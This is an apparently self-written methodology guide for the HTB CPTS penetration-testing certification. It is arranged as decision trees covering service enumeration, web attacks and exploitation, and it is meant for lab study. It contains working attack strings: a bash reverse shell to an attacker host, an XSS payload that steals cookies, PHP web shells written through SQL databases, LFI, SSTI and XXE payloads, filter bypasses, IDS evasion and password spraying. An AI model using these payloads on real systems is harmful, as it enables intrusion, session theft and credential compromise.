# CPTS Exam Methodology: The Master Guide

> **Exhaustive, tool-by-tool, decision-driven methodology for the HTB CPTS exam.**
> Based on complete analysis of all 27 CPTS Academy modules. Every attack, every tool, every bypass.

---

## Table of Contents

1. [Phase 0: Pre-Engagement Setup](#phase-0-pre-engagement-setup)
2. [Phase 1: Information Gathering & Enumeration](#phase-1-information-gathering--enumeration)
3. [Phase 2: Vulnerability Assessment](#phase-2-vulnerability-assessment)
4. [Phase 3: Exploitation](#phase-3-exploitation)
5. [Phase 4: Post-Exploitation & Privilege Escalation](#phase-4-post-exploitation--privilege-escalation)
6. [Phase 5: Active Directory Domain Dominance](#phase-5-active-directory-domain-dominance)
7. [Phase 6: Lateral Movement & Pivoting](#phase-6-lateral-movement--pivoting)
8. [Phase 7: Documentation & Reporting](#phase-7-documentation--reporting)
9. [Quick Reference Cheat Sheets](#quick-reference-cheat-sheets)

---

## Phase 0: Pre-Engagement Setup

### Before You Start the Exam

```
START
  │
  ├─► Set up folder structure:
  │     Project/
  │     ├── scans/
  │     ├── evidence/
  │     │   ├── credentials/
  │     │   └── screenshots/
  │     ├── logs/
  │     ├── tools/
  │     └── notes.md
  │
  ├─► Start tmux session (prefix: Ctrl+B)
  │     ├── Window 0: Main enumeration
  │     ├── Window 1: Exploitation
  │     ├── Window 2: Post-exploitation / AD attacks
  │     └── Window 3: Notes/Documentation
  │
  ├─► Verify VPN connectivity
  │     sudo openvpn user.ovpn
  │     ifconfig tun0
  │
  ├─► Prepare cheat sheets & tools
  │     ├── SecLists wordlists
  │     ├── Static binaries (socat, nc, chisel)
  │     ├── LinPEAS/WinPEAS
  │     ├── BloodHound.py, Impacket toolkit
  │     └── Responder, Kerbrute
  │
  └─► Start Responder IMMEDIATELY if internal network
        sudo responder -I <interface> -dwf
        (Capture hashes passively while you work)
```

---

## Phase 1: Information Gathering & Enumeration

### 1A: Network-Level Enumeration

```
TARGET IP / NETWORK RECEIVED
  │
  ├─► Is this a single host or network range?
  │     ├── SINGLE HOST ──► Go to 1B: Host Enumeration
  │     └── NETWORK RANGE ──► Host Discovery First
  │           sudo nmap <CIDR> -sn -oA tnet | grep for | cut -d" " -f5
  │           fping -asgq <CIDR> 2>/dev/null
  │           │
  │           └── For each live host ──► Go to 1B
  │
  ├─► Passive network analysis (if internal)
  │     sudo responder -I <interface> -A    (Analyze mode, no poisoning)
  │     sudo tcpdump -i <interface>          (Capture traffic)
  │     sudo -E wireshark                    (GUI analysis)
  │     │
  │     └── Look for: hostnames via MDNS, ARP, LLMNR, NBT-NS
  │
  └─► Do you have credentials already?
        ├── YES ──► Authenticated scanning (Nessus, Nmap --script with creds)
        └── NO  ──► Unauthenticated enumeration (default path)
```

### 1B: Host Enumeration — The Core Decision Tree

```
LIVE HOST IDENTIFIED
  │
  ├─► STEP 1: Quick Port Scan (top 1000)
  │     nmap -sC -sV --top-ports=1000 <IP> -oA initial
  │     │
  │     └── While that runs, start ALL-PORT scan in background:
  │           nmap -p- -sV -sC <IP> -oA fullscan &
  │
  ├─► STEP 2: Determine OS from scan results
  │     │
  │     ├── WINDOWS INDICATORS:
  │     │   - Port 3389 (RDP)
  │     │   - Port 5985/5986 (WinRM)
  │     │   - Port 135 (MSRPC)
  │     │   - Port 139+445 (SMB) with Windows details
  │     │   - Port 88 (Kerberos) ──► Active Directory environment!
  │     │   - Port 389/636/3268/3269 (LDAP) ──► Domain Controller!
  │     │   └──► Go to WINDOWS ENUMERATION path
  │     │
  │     └── LINUX INDICATORS:
  │         - Port 22 (SSH) with OpenSSH
  │         - Port 80/443 with Apache/Nginx
  │         - Port 139+445 with Samba
  │         └──► Go to LINUX ENUMERATION path
  │
  └─► STEP 3: UDP Scan (if TCP yields little)
        sudo nmap -sU --top-ports=100 <IP> -oA udp_scan
        (Look for: SNMP 161, DNS 53, TFTP 69, LDAP 389, IPMI 623)

### 1D: Nmap Firewall/IDS Evasion Techniques

```
NMAP SCAN BLOCKED OR INCOMPLETE? TRY EVASION:
  │
  ├─► Fragment packets (split across multiple IP packets)
  │     nmap -f <IP>                    # 8-byte fragments
  │     nmap -ff <IP>                   # 16-byte fragments
  │
  ├─► Decoy scan (hide among decoy traffic)
  │     nmap -D RND:10 <IP>             # Random 10 decoys
  │     nmap -D decoy1,decoy2,ME <IP>   # Specific decoys
  │
  ├─► Spoof source port (bypass firewall rules)
  │     nmap --source-port 53 <IP>      # DNS port often allowed
  │     nmap --source-port 88 <IP>      # Kerberos port often allowed
  │     nmap --source-port 80 <IP>      # HTTP port often allowed
  │
  ├─► Adjust data length / MTU
  │     nmap --data-length 25 <IP>      # Add random data to packets
  │     nmap --mtu 24 <IP>             # Set specific MTU (implies -f)
  │
  ├─► Use specific IP protocol
  │     nmap -sO -p 1,6,17 <IP>        # ICMP, TCP, UDP protocols
  │
  ├─► Scan timing adjustments
  │     nmap -T1 <IP>                   # Sneaky (very slow, evades IDS)
  │     nmap --scan-delay 1s <IP>       # 1 second between probes
  │     nmap --max-rate 10 <IP>         # Limit to 10 packets/sec
  │
  ├─► Idle/Zombie scan (completely hide your IP)
  │     nmap -sI <zombie_host> <IP>     # Use idle host as source
  │
  ├─► Proxychains (route through proxy)
  │     proxychains nmap -sT <IP>       # Route through SOCKS proxy
  │
  └─► Combine techniques for maximum evasion:
        nmap -f -D RND:5 --source-port 53 --data-length 25 -T2 <IP>
```

### 1C: Service-by-Service Enumeration

#### PORT 21 (FTP)

```
PORT 21 (FTP)
  │
  ├─► Anonymous login?
  │     ftp <IP> → anonymous:anonymous
  │     │
  │     ├── YES ──► Download ALL files
  │     │     wget -m --no-passive ftp://anonymous:anonymous@<IP>
  │     │     │
  │     │     └── Check for: credentials, configs, notes, SSH keys
  │     │
  │     └── NO ──► Try default credentials, brute force if usernames known
  │
  ├─► Can we UPLOAD files? (writeable directory)
  │     ftp> put test.txt
  │     │
  │     ├── YES + Web server present ──► Upload PHP web shell!
  │     │     └── Access via http://<IP>/upload_dir/shell.php
  │     │
  │     └── NO ──► Continue enumeration
  │
  └─► Version-specific exploits?
        vsftpd 2.3.4 ──► Backdoor (CVE-2011-2523)
        ProFTPD 1.3.5 ──► Backdoor (CVE-2015-3306)
        ProFTPD 1.3.3c ──► Backdoor (CVE-2010-4221)
```

#### PORT 22 (SSH)

```
PORT 22 (SSH)
  │
  ├─► Banner grab: nc -nv <IP> 22
  │     └── Note exact version (e.g., OpenSSH 7.6p1 Ubuntu)
  │
  ├─► Have credentials?
  │     ├── YES ──► ssh user@<IP> (preferred over reverse shell!)
  │     │     └── SSH is more stable, supports port forwarding
  │     │
  │     └── NO ──► Check for:
  │           ├── Leaked SSH keys (FTP, SMB shares, GitHub)
  │           ├── Credentials from other services (password reuse)
  │           └── Brute force (if username list available)
  │                 hydra -l user -P wordlist ssh://<IP>
  │
  └─► Key-based auth only?
        └── Find private key on target or in shares
              find / -name id_rsa 2>/dev/null
              find / -name authorized_keys 2>/dev/null
```

#### PORT 25/110/143/993/995 (MAIL SERVICES)

```
MAIL SERVICES
  │
  ├─► Enumerate users via SMTP
  │     smtp-user-enum -U wordlist -M VRFY <IP>
  │     smtp-user-enum -U wordlist -M RCPT <IP>
  │     │
  │     └── Build username list for password spraying
  │
  ├─► Check for credentials in other services
  │
  ├─► Read emails (if credentials obtained)
  │     openssl s_client -connect <IP>:993 -quiet
  │     │
  │     └── Look for: credentials, internal URLs, attachments
  │
  ├─► Open Relay Check
  │     telnet <IP> 25
  │     MAIL FROM: test@test.com
  │     RCPT TO: target@external.com
  │     │
  │     └── If 250 OK ──► Open relay! Can send phishing emails as anyone
  │           swaks --from test@test.com --to target@external.com --server <IP>
  │
  └─► Phishing potential (if in scope)
```

#### PORT 53 (DNS)

```
PORT 53 (DNS)
  │
  ├─► Zone transfer attempt
  │     dig axfr @<IP> <domain>
  │     │
  │     ├── SUCCESS ──► JACKPOT! Full subdomain/IP list
  │     │
  │     └── FAIL ──► Continue with other DNS enum
  │
  ├─► DNS records enumeration
  │     dig any <domain>
  │     dig txt <domain>  (SPF, verification records)
  │     dig mx <domain>
  │
  ├─► Subdomain brute force
  │     dnsenum --enum <domain> -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
  │     dnsrecon -d <domain> -t std
  │
  ├─► Certificate Transparency logs
  │     https://crt.sh/?q=<domain>
  │     │
  │     └── Find subdomains, internal hostnames, email addresses
  │
  └─► AD DNS enumeration (if authenticated)
        adidnsdump -u <domain>\\user -p <pass> <DC_IP>
        └── Dump all DNS records from AD
```

#### PORT 623 (IPMI)

```
PORT 623 (IPMI)
  │
  ├─► Version detection
  │     nmap -sU -p 623 --script ipmi-version <IP>
  │     msf> use auxiliary/scanner/ipmi/ipmi_version
  │
  ├─► Dump IPMI hashes (RAKP flaw in IPMI 2.0)
  │     msf> use auxiliary/scanner/ipmi/ipmi_dumphashes
  │     │
  │     └── Got hash? ──► Crack with Hashcat mode 7300
  │           hashcat -m 7300 ipmi_hashes.txt rockyou.txt
  │           # HP iLO default: hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
  │
  ├─► Default credentials on BMC
  │     Try: ADMIN:ADMIN, root:root, admin:admin
  │     └── Check for password reuse on other systems!
  │
  └─► IPMI is VERY common in enterprise — always check for it!
        Can lead to: unauthorized access, system disruption, RCE
```

#### PORT 1521 (Oracle TNS)

```
PORT 1521 (Oracle TNS)
  │
  ├─► Enumerate TNS listener
  │     nmap -p 1521 --script oracle-tns-version <IP>
  │     ./odat.py tnscmd -s <IP> -p 1521 --ping
  │     ./odat.py tnscmd -s <IP> -p 1521 --version
  │
  ├─► Enumerate SID (database instance name)
  │     ./odat.py sidguesser -s <IP> -p 1521
  │     nmap -p 1521 --script oracle-sid-brute <IP>
  │     │
  │     └── Common SIDs: ORCL, XE, ORCLCDB, ORCLPDB1
  │
  ├─► Default credentials?
  │     Try: scott:tiger, system:oracle, sys:change_on_install
  │     ./odat.py passwordguesser -s <IP> -p 1521 -d <SID>
  │
  ├─► With valid credentials ──► ODAT toolkit
  │     ├── Upload files: ./odat.py utlfile -s <IP> -d <SID> -u user -p pass --putFile /tmp shell.php <?php system($_GET['cmd']);?>
  │     ├── Execute commands: ./odat.py externaltable -s <IP> -d <SID> -u user -p pass --exec /tmp/shell
  │     ├── Read files: ./odat.py utlfile -s <IP> -d <SID> -u user -p pass --getFile /etc/passwd ./passwd
  │     └── SMB relay: ./odat.py smb -s <IP> -d <SID> -u user -p pass --dir \\\\<ATTACKER>\\share
  │
  └─► Oracle is complex — use ODAT for all operations
        git clone https://github.com/quentinhardy/odat.git
```

#### PORT 5900 (VNC)

```
PORT 5900 (VNC)
  │
  ├─► Banner grab: nc -nv <IP> 5900
  │     └── Note version string (e.g., RFB 003.008 = VNC 3.8)
  │
  ├─► Default/weak credentials
  │     Try: password:password, password:123456
  │     vncviewer <IP>:0
  │
  ├─► Brute force
  │     hydra -P wordlist vnc://<IP>
  │
  └─► VNC password stored in registry (Windows):
        reg query HKLM\SOFTWARE\RealVNC\vncserver /v Password
        └── Decrypt with vncpwd or online tools
```

#### PORT 80/443/8080/8443 (WEB) ──► See Section 3B: Web Attack Decision Tree

#### PORT 139/445 (SMB)

```
PORT 139/445 (SMB)
  │
  ├─► Enumerate shares
  │     smbclient -N -L \\\\<IP>\\
  │     crackmapexec smb <IP> --shares
  │     smbmap -H <IP>
  │     │
  │     ├── NULL session allowed?
  │     │     smbclient -N \\\\<IP>\\<share>
  │     │     rpcclient -U "" <IP> -c "enumdomusers"
  │     │     enum4linux -a <IP>
  │     │     enum4linux-ng -A <IP>
  │     │     │
  │     │     └── Download interesting files (credentials, configs, scripts)
  │     │
  │     └── Need credentials?
  │           └── Try from other services / brute force
  │
  ├─► OS & version info
  │     nmap --script smb-os-discovery -p445 <IP>
  │     crackmapexec smb <IP>
  │     │
  │     ├── Windows 7/Server 2008 R2 ──► Check EternalBlue (MS17-010)
  │     │     nmap --script smb-vuln-ms17-010 -p445 <IP>
  │     │
  │     └── Samba ──► Check version for known CVEs
  │
  ├─► Enumerate users (if credentials available)
  │     crackmapexec smb <IP> -u 'user' -p 'pass' --users
  │     rpcclient -U "user" <IP> -c "enumdomusers"
  │     ldapsearch -x -H ldap://<IP> -b "dc=domain,dc=com" "(objectClass=user)" sAMAccountName
  │
  ├─► SMB signing disabled?
  │     crackmapexec smb <IP> --signing
  │     nmap --script smb2-security-mode -p445 <IP>
  │     │
  │     └── Potential for NTLM relay attacks!
  │
  └─► Check for GPP passwords (if authenticated)
        crackmapexec smb <IP> -u user -p pass --gpp-password
        gpp-decrypt <encrypted_password>
```

#### PORT 161 (SNMP)

```
PORT 161 (SNMP)
  │
  ├─► Try default community strings
  │     snmpwalk -v 2c -c public <IP>
  │     onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt <IP>
  │     │
  │     ├── SUCCESS ──► Enumerate extensively:
  │     │     ├── Process list (may contain credentials!)
  │     │     │     snmpwalk -v 2c -c public <IP> 1.3.6.1.2.1.25.4.2.1.2
  │     │     ├── Installed software
  │     │     ├── Network info
  │     │     ├── Windows user enumeration:
  │     │     │     snmpwalk -v 2c -c public <IP> 1.3.6.1.4.1.77.1.2.25
  │     │     └── Running services:
  │     │           snmpwalk -v 2c -c public <IP> 1.3.6.1.2.1.25.4.2.1.2
  │     │
  │     └── FAIL ──► Try brute forcing community string
  │           onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt <IP>
  │
  └─► SNMPv3? ──► Try default credentials, brute force
```

#### PORT 389/636/88/464 (LDAP/KERBEROS) ──► ACTIVE DIRECTORY PATH

```
LDAP/KERBEROS DETECTED ──► AD ENVIRONMENT!
  │
  ├─► LDAP enumeration
  │     ldapsearch -x -H ldap://<IP> -b "dc=domain,dc=com"
  │     windapsearch -d <domain> --dc <IP> -u "" -U  (users)
  │     windapsearch -d <domain> --dc <IP> -u "" -C  (computers)
  │     │
  │     └── Extract: users, groups, policies, domain info, GPOs
  │
  ├─► Kerberos user enumeration
  │     kerbrute userenum --dc <IP> -d <domain> userlist.txt
  │     │
  │     └── Build validated user list for password spraying
  │
  ├─► AS-REP Roasting (users with DONT_REQ_PREAUTH)
  │     GetNPUsers.py <domain>/ -usersfile users.txt -dc-ip <IP>
  │     │
  │     └── Crack hash: hashcat -m 18200 hash.txt rockyou.txt
  │
  └─► Kerberoasting (if we have ANY valid credentials)
        GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <IP> -request
        │
        └── Crack TGS: hashcat -m 13100 hash.txt rockyou.txt
```

#### PORT 1433/3306/5432 (DATABASES)

```
DATABASE PORT DETECTED
  │
  ├─► MSSQL (1433)
  │     ├── Default credentials: sa:sa, sa:blank
  │     ├── Connect: mssqlclient.py <user>:<pass>@<IP>
  │     │
  │     ├── Can we execute commands?
  │     │     EXEC master..xp_cmdshell 'whoami'
  │     │     │
  │     │     ├── xp_cmdshell disabled? ──► Try re-enabling:
  │     │     │     EXEC sp_configure 'show advanced options', 1;
  │     │     │     RECONFIGURE;
  │     │     │     EXEC sp_configure 'xp_cmdshell', 1;
  │     │     │     RECONFIGURE;
  │     │     │
  │     │     └── Still blocked? ──► Try custom assembly or Ole Automation
  │     │
  │     ├── Capture MSSQL Service Hash (if no creds):
  │     │     Use Responder or ntlmrelayx to capture NTLM hash
  │     │     EXEC master..xp_dirtree '\\<ATTACKER>\share'
  │     │
  │     ├── Impersonate existing users:
  │     │     EXEC AS USER = 'sa'; EXEC master..xp_cmdshell 'whoami'
  │     │
  │     └── Communicate with other databases (linked servers):
  │           EXEC ('whoami') AT [linked_server]
  │
  ├─► MySQL (3306)
  │     ├── Default credentials: root:blank, root:root
  │     ├── Connect: mysql -u root -p -h <IP>
  │     │
  │     ├── Read files: SELECT LOAD_FILE('/etc/passwd')
  │     ├── Write web shell: SELECT "<?php system($_GET['cmd']);?>" INTO OUTFILE '/var/www/html/shell.php'
  │     └── Check for credentials in databases
  │
  └─► PostgreSQL (5432)
        ├── Default credentials: postgres:postgres
        ├── Connect: psql -U postgres -h <IP>
        │
        ├── Read files:
        │     CREATE TABLE temp(t TEXT); COPY temp FROM '/etc/passwd'; SELECT * FROM temp;
        │
        ├── Write web shell:
        │     COPY (SELECT '<?php system($_GET["cmd"]);?>') TO '/var/www/html/shell.php';
        │
        └── Command execution (if superuser):
              CREATE OR REPLACE FUNCTION exec(cmd text) RETURNS text AS $$
              BEGIN RETURN cmd; END; $$ LANGUAGE plpgsql;
              COPY (SELECT exec('whoami')) TO '/tmp/output';
```

#### PORT 2049 (NFS)

```
PORT 2049 (NFS)
  │
  ├─► Show available mounts
  │     showmount -e <IP>
  │
  ├─► Mount the share
  │     sudo mount -t nfs <IP>:/ /mnt/nfs
  │     sudo mount -t nfs <IP>:/share /mnt/nfs -o nolock
  │
  ├─► Check for interesting files
  │     ├── SSH keys, credentials, configs
  │     └── Check for SUID binaries on NFS share
  │
  └─► no_root_squash? ──► Mount and write SUID binary
        sudo mount -t nfs <IP>:/share /mnt/nfs -o nolock
        cp /bin/bash /mnt/nfs/bash && chmod +s /mnt/nfs/bash
        # On target: /share/bash -p
```

#### PORT 3389 (RDP)

```
PORT 3389 (RDP)
  │
  ├─► Connect with credentials
  │     xfreerdp /v:<IP> /u:user /p:pass +clipboard
  │     xfreerdp /v:<IP> /u:user /pth:<NTLM_HASH>  (Pass-the-Hash)
  │
  ├─► Check for BlueKeep (CVE-2019-0708) on older Windows
  │     nmap --script rdp-vuln-ms12-020 -p3389 <IP>
  │
  └─► Brute force (if username known)
        hydra -l user -P wordlist rdp://<IP>
```

#### PORT 5985/5986 (WinRM)

```
PORT 5985/5986 (WinRM)
  │
  ├─► Connect with credentials
  │     evil-winrm -i <IP> -u user -p pass
  │     evil-winrm -i <IP> -u user -H <NTLM_HASH>  (Pass-the-Hash)
  │
  └─► Brute force
        crackmapexec winrm <IP> -u users.txt -p passwords.txt
```

---

## Phase 2: Vulnerability Assessment

```
ENUMERATION COMPLETE (or sufficient data gathered)
  │
  ├─► STEP 1: Organize findings
  │     ├── List all open ports with service versions
  │     ├── List all discovered credentials
  │     ├── List all discovered users
  │     └── List all discovered file paths/shares
  │
  ├─► STEP 2: Search for known vulnerabilities
  │     │
  │     ├── For EACH service version found:
  │     │     searchsploit <service> <version>
  │     │     │
  │     │     ├── Remote code execution? ──► HIGH PRIORITY
  │     │     ├── Authentication bypass? ──► HIGH PRIORITY
  │     │     ├── Privilege escalation? ──► MEDIUM PRIORITY
  │     │     └── Denial of service? ──► LOW PRIORITY (usually skip)
  │     │
  │     └── Check exploit-db.com, rapid7 DB, CVE databases
  │
  ├─► STEP 3: Automated vulnerability scanning (if time permits)
  │     nmap --script vuln -p<ports> <IP>
  │     nikto -h http://<IP>  (for web)
  │     nessus scan (if available)
  │
  └─► STEP 4: Prioritize attack vectors
        │
        ├── PRIORITY 1: Remote code execution exploits
        ├── PRIORITY 2: Credential-based access (SSH, SMB, RDP, WinRM)
        ├── PRIORITY 3: Web application vulnerabilities
        ├── PRIORITY 4: Misconfigurations (anonymous FTP, SMB shares)
        └── PRIORITY 5: Brute force (last resort — noisy!)
```

---

## Phase 3: Exploitation

### 3A: Network Service Exploitation

```
VULNERABILITY IDENTIFIED
  │
  ├─► Is there a public exploit available?
  │     │
  │     ├── YES ──► Is it a Metasploit module?
  │     │     │     ├── YES ──► Use Metasploit
  │     │     │     │     msfconsole
  │     │     │     │     search <vulnerability>
  │     │     │     │     use <module>
  │     │     │     │     set RHOSTS <IP>
  │     │     │     │     set LHOST <tun0_IP>
  │     │     │     │     set PAYLOAD <appropriate_payload>
  │     │     │     │     exploit
  │     │     │     │
  │     │     │     └── Got shell? ──► Go to Phase 4
  │     │     │
  │     │     └── NO ──► Manual exploitation
  │     │           ├── Download PoC from ExploitDB
  │     │           ├── Review and understand the code
  │     │           ├── Modify for target environment
  │     │           └── Execute
  │     │
  │     └── NO ──► Move to next vulnerability or service
  │
  ├─► Have valid credentials?
  │     │
  │     ├── YES ──► Which service?
  │     │     ├── SSH ──► ssh user@<IP> (BEST — stable, full TTY)
  │     │     ├── SMB ──► crackmapexec smb/winrm/rdp
  │     │     ├── RDP ──► xfreerdp /v:<IP> /u:user /p:pass
  │     │     ├── WinRM ──► evil-winrm -i <IP> -u user -p pass
  │     │     ├── MSSQL ──► mssqlclient.py user:pass@<IP>
  │     │     └── Web App ──► Login and test for IDOR, upload, etc.
  │     │
  │     └── NO ──► Try password attacks
  │           ├── Password spraying (common passwords)
  │           │     crackmapexec smb <IP> -u users.txt -p 'Password1!'
  │           │     crackmapexec smb <IP> -u users.txt -p 'Spring2024!'
  │           │     crackmapexec smb <IP> -u users.txt -p 'Welcome1!'
  │           │
  │           ├── Brute force (if username known)
  │           │     hydra -l user -P rockyou.txt <service>://<IP>
  │           │
  │           └── Credential stuffing (from found data)
  │
  └─► Web application exploitation ──► See Section 3B
```

### 3B: Web Attack Decision Tree

```
WEB APPLICATION FOUND (Port 80/443/8080/etc.)
  │
  ├─► STEP 1: Technology Fingerprinting
  │     whatweb http://<IP>
  │     curl -IL http://<IP>
  │     wappalyzer (browser extension)
  │     │
  │     └── Identify: CMS, framework, language, server, OS
  │
  ├─► STEP 2: Directory/File Enumeration
  │     gobuster dir -u http://<IP> -w /usr/share/seclists/Discovery/Web-Content/common.txt
  │     ffuf -u http://<IP>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
  │     │
  │     ├── Found interesting directories? ──► Enumerate deeper (recursive)
  │     │     ffuf -u http://<IP>/FUZZ -w wordlist -recursion -recursion-depth 2
  │     │
  │     ├── Found login page? ──► Try default creds, brute force
  │     ├── Found upload form? ──► Try file upload attack
  │     ├── Found admin panel? ──► Try default creds, auth bypass
  │     └── Found API endpoint? ──► Test for IDOR, auth issues
  │
  ├─► STEP 3: Extension Fuzzing
  │     ffuf -u http://<IP>/index.FUZZ -w extensions.txt
  │     │
  │     └── Look for: .php, .asp, .aspx, .jsp, .html, .txt, .bak
  │
  ├─► STEP 4: Parameter Fuzzing
  │     ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
  │          -u 'http://<IP>/index.php?FUZZ=value' -fs <default_size>
  │     │
  │     └── Found parameter? ──► Test for injection, LFI, etc.
  │
  ├─► STEP 5: Subdomain/VHost Enumeration
  │     ffuf -u http://<IP> -H "Host: FUZZ.<domain>" -w subdomains.txt -fc 301
  │     gobuster vhost -u http://<IP> -w subdomains.txt --append-domain
  │     │
  │     └── Different vhost? ──► Enumerate separately
  │
  ├─► STEP 6: Check for common web vulnerabilities
  │     │
  │     ├── SOURCE CODE VIEW ──► Check HTML comments, hidden fields, JS files
  │     ├── ROBOTS.TXT ──► Check for hidden paths
  │     ├── CERTIFICATE ──► Check for subdomains, emails
  │     ├── ERROR MESSAGES ──► Information disclosure
  │     └── SITEMAP.XML ──► Hidden URLs
  │
  └─► STEP 7: Attack specific vulnerability classes
        │
        ├── INPUT FIELDS present?
        │     │
        │     ├── SQL Injection?
        │     │     │   Test: ' OR 1=1-- , " OR 1=1--
        │     │     │   │
        │     │     │   ├── CONFIRMED ──►
        │     │     │   │     ├── Union-based: ' UNION SELECT 1,2,3--
        │     │     │   │     ├── Error-based: Trigger SQL errors
        │     │     │   │     ├── Blind Boolean: ' AND 1=1--
        │     │     │   │     ├── Blind Time: ' AND SLEEP(5)--
        │     │     │   │     ├── Use sqlmap: sqlmap -u "URL" --forms --batch --dbs
        │     │     │   │     ├── Read /etc/passwd or web.config
        │     │     │   │     │     sqlmap -u "URL" --os-shell
        │     │     │   │     └── SQLMap advanced:
        │     │     │   │           sqlmap -r request.txt --level=5 --risk=3
        │     │     │   │           sqlmap -u "URL" --tamper=space2comment
        │     │     │   │           sqlmap -u "URL" --second-order="URL2"
        │     │     │   │
        │     │     │   └── NOT CONFIRMED ──► Try other injection types
        │     │     │
        │     ├── Command Injection?
        │     │     │   Test: ; whoami, | id, `id`, $(whoami)
        │     │     │   │
        │     │     │   ├── CONFIRMED ──► Get reverse shell
        │     │     │   │     ; bash -i >& /dev/tcp/<ATTACKER>/<PORT> 0>&1
        │     │     │   │
        │     │     │   └── Filtered? ──► Try bypass techniques:
        │     │     │         ├── Space filter: ${IFS}, %09, {cat,/etc/passwd}
        │     │     │         ├── Slash filter: ${PATH:0:1}
        │     │     │         ├── URL encoding: %3B (for ;)
        │     │     │         ├── Double encoding: %253B
        │     │     │         ├── Case variation: WhOaMi (Windows)
        │     │     │         ├── Quotes: w'h'o'am'i or w"h"o"am"i
        │     │     │         ├── Backslash: w\h\o\a\m\i
        │     │     │         ├── Reverse: $(rev<<<'imaohw')
        │     │     │         ├── Newline: %0a (alternative delimiter)
        │     │     │         ├── Encoded commands: echo d2hvYW1p | base64 -d | bash
        │     │     │         └── Linux (Bashfuscator) / Windows (DOSfuscation)
        │     │     │
        │     ├── XSS (Cross-Site Scripting)?
        │     │     │   Test: <script>alert(1)</script>
        │     │     │   │
        │     │     │   ├── Reflected ──► Cookie stealing, session hijack
        │     │     │   │     <script>new Image().src="http://<ATTACKER>/?c="+document.cookie</script>
        │     │     │   │
        │     │     │   ├── Stored ──► Persistent attack, affects all users
        │     │     │   │
        │     │     │   ├── DOM-based ──► Client-side exploitation
        │     │     │   │
        │     │     │   └── Blind XSS ──► Use XSSHunter or similar
        │     │     │         Payload in fields that admins view (e.g., User-Agent, support forms)
        │     │     │
        │     ├── File Inclusion (LFI/RFI)?
        │     │     │   Test: ?page=../../../etc/passwd
        │     │     │   │
        │     │     │   ├── LFI CONFIRMED ──►
        │     │     │   │     ├── Read sensitive files:
        │     │     │   │     │     /etc/passwd, /etc/shadow, /etc/hosts
        │     │     │   │     │     /var/log/auth.log, /proc/self/environ
        │     │     │   │     │
        │     │     │   │     ├── PHP filter wrapper (source disclosure):
        │     │     │   │     │     php://filter/read=convert.base64-encode/resource=config
        │     │     │   │     │     php://filter/read=convert.base64-encode/resource=../../../etc/passwd
        │     │     │   │     │
        │     │     │   │     ├── PHP data wrapper (RCE):
        │     │     │   │     │     data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+&cmd=id
        │     │     │   │     │
        │     │     │   │     ├── PHP input wrapper (RCE):
        │     │     │   │     │     curl -X POST --data '<?php system("id"); ?>' 'http://target/index.php?page=php://input'
        │     │     │   │     │
        │     │     │   │     ├── Log poisoning → RCE:
        │     │     │   │     │     Apache/Nginx: Change User-Agent to <?php system($_GET['cmd']); ?>
        │     │     │   │     │     Then include: ?page=/var/log/apache2/access.log&cmd=id
        │     │     │   │     │     SSH: ssh '<?php system($_GET["cmd"]); ?>'@target
        │     │     │   │     │     Then include: ?page=/var/log/auth.log&cmd=id
        │     │     │   │     │
        │     │     │   │     ├── PHP session poisoning → RCE
        │     │     │   │     │
        │     │     │   │     └── Filter bypasses:
        │     │     │   │           ├── ../ stripped? ──► Try ....// or ..././
        │     │     │   │           ├── Double URL encode: %252e%252e%252f
        │     │     │   │           ├── Null byte: ../../../etc/passwd%00
        │     │     │   │           └── Path truncation: ../../../etc/passwd...............
        │     │     │   │
        │     │     │   └── RFI CONFIRMED ──►
        │     │     │         ├── Include remote PHP shell
        │     │     │         └── http://<ATTACKER>/shell.php
        │     │     │
        │     ├── SSTI (Server-Side Template Injection)?
        │     │     │   Test: {{7*7}} or ${7*7} or <%= 7*7 %>
        │     │     │   │
        │     │     │   └── CONFIRMED ──► Identify template engine and exploit
        │     │     │         ├── Jinja2: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
        │     │     │         ├── Twig: {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
        │     │     │         └── ERB: <%= `id` %>
        │     │     │
        │     └── XXE (XML External Entity)?
        │           │   Test: Submit XML with external entity
        │           │   │
        │           └── CONFIRMED ──►
        │                 ├── Read files:
        │                 │     <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>
        │                 │
        │                 ├── SSRF via XXE:
        │                 │     <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/internal">
        │                 │
        │                 └── OOB XXE (if blind):
        │                       <!ENTITY % dtd SYSTEM "http://<ATTACKER>/evil.dtd">%dtd;
        │
        ├── FILE UPLOAD present?
        │     │
        │     ├── What extensions are allowed?
        │     │     ├── PHP allowed? ──► Upload PHP web shell directly
        │     │     ├── Only images? ──► Try:
        │     │     │     ├── Double extension: shell.php.jpg
        │     │     │     ├── Reverse double extension: shell.jpg.php
        │     │     │     ├── Null byte: shell.php%00.jpg
        │     │     │     ├── Content-Type bypass (change MIME type to image/jpeg)
        │     │     │     ├── Magic bytes: Add GIF89a before PHP code
        │     │     │     ├── Alternative extensions: .phtml, .php5, .phar, .pgif
        │     │     │     └── .htaccess upload (if Apache):
        │     │     │           AddType application/x-httpd-php .jpg
        │     │     │           (Then upload shell.jpg which will be executed as PHP)
        │     │     │
        │     │     └── Server-side validation only?
        │     │           └── Bypass client-side JS checks (intercept with Burp)
        │     │
        │     └── Where is the uploaded file?
        │           └── Find upload directory via gobuster/ffuf
        │
        ├── AUTHENTICATION present?
        │     │
        │     ├── Login brute force
        │     │     hydra -l user -P passlist http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"
        │     │
        │     ├── Default credentials? ──► Check manufacturer docs
        │     │
        │     ├── Auth bypass?
        │     │     ├── IDOR: Change user ID in URL/cookie
        │     │     ├── Force browsing: Access /admin directly
        │     │     ├── HTTP Verb Tampering: Try PUT, PATCH instead of POST
        │     │     └── Cookie manipulation: Change role in cookie/JWT
        │     │
        │     └── SQL injection on login?
        │           ' OR 1=1-- (admin bypass)
        │
